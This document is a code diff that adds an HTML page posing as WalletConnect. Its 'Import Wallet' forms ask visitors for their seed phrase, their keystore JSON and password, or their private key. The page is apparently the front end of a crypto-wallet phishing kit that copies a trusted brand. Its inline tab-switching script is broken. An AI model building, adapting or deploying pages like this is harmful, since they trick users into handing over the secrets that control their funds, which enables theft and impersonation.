@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>walletconnect</title>
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+<body>
+
+	<nav class="navbar navbar-expand-sm bg-transparent justify-content-center sticky-top py-3 px-md-0">
+        <ul class="nav">
+            <li class="nav-item pt-2 mr-md-5">
+            <a class="nav-link pr-md-2" href="#">GitHub</a>
+            </li>
+            <li class="nav-item pt-2 mx-md-5 px-md-5">
+            <a class="nav-link" href="#">Docs</a>
+            </li>
+            <li class="nav-item mx-md-5">
+            <a class="nav-link py-0" href="index.html"><img src="/img/logo.dfa25e47.svg" class="logo"></a>
+            </li>
+            <li class="nav-item pt-2 mx-md-5 px-md-5">
+            <a class="nav-link" href="wallets.html">Wallets</a>
+            </li>
+            <li class="nav-item pt-2 ml-md-5">
+            <a class="nav-link pl-md-2" href="polkadot.html">Apps</a>
+            </li>
+        </ul>
+    </nav>
+
+    <div class="container-fluid text-center polkadot my-5 pt-4">
+	    <h2>Import Wallet</h2>
+        <div class="my-5" id="polBtn">
+            <button type="button" class="btn pol_btn active">Phrase</button>
+            <button type="button" class="btn pol_btn">Keystore JSON</button>
+            <button type="button" class="btn pol_btn">Private Key</button>
+        </div>
+
+        <div id="phrase">
+            <form class="px-4" action="" post>
+                <input class="form-control high_input mt-4 mb-5" type="text" placeholder="Phrase">
+                <button type="submit" class="btn wallet_btn px-3 py-2">Import</button>
+            </form>
+            <p class="my-5 py-2">Typically 12 (sometimes 24) words separated by single spaces</p>            
+        </div>
+
+        <div id="keystore">
+            <form class="px-4" action="" post>
+                <input class="form-control high_input mt-4" type="text" placeholder="Keystore Json">
+                <input class="form-control mt-3 mb-5" type="text" placeholder="Password">
+                <button type="submit" class="btn wallet_btn px-3 py-2">Import</button>
+            </form>
+            <p class="my-5 py-2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</p>            
+        </div>
+
+        <div id="private">
+            <form class="px-4" action="" post>
+                <input class="form-control mt-4 mb-5" type="text" placeholder="Private Key">
+                <button type="submit" class="btn wallet_btn px-3 py-2">Import</button>
+            </form>
+            <p class="my-5 py-2">Typically a combination of letters and numbers (make sure it's entered correctly)</p>            
+        </div>
+    </div>
+
+    <script>
+        var header = document.getElementById("polBtn");
+        var btns = header.getElementByClassName("pol_btn");
+        for (var i = 0; i < btns.length; i++) {
+            btns[i].addEventListener("click", function() {
+                var current = document.getElementByClassName("active");
+                current[0].className = current[0].className.replace(" active", "");
+                this.className += " active";
+            })
+        }
+        
+    </script>
+
+
+    <footer class="container text-center p-5">
+        <ul class="p-0 m-auto">
+            <li><a class="m-4" href="Javascript:void(0);"><img src="/img/Discord.svg">Discord</a></li>
+            <li><a class="m-4" href="Javascript:void(0);"><img src="/img/Telegram.svg">Telegram</a></li>
+            <li><a class="m-4" href="Javascript:void(0);"><img src="img/Twitter.svg">Twitter</a></li>
+            <li><a class="m-4" href="Javascript:void(0);"><img src="/img/GitHub.svg">GitHub</a></li>
+        </ul>
+    </footer>
+
+
+
+
+<script type="text/javascript" src="js/jquery.js"></script>
+<script type="text/javascript" src="js/popper.js"></script>
+<script type="text/javascript" src="js/bootstrap.min.js"></script>
+<script type="text/javascript" src="js/theme.js"></script>
+
+
+
+</body>
+</html>
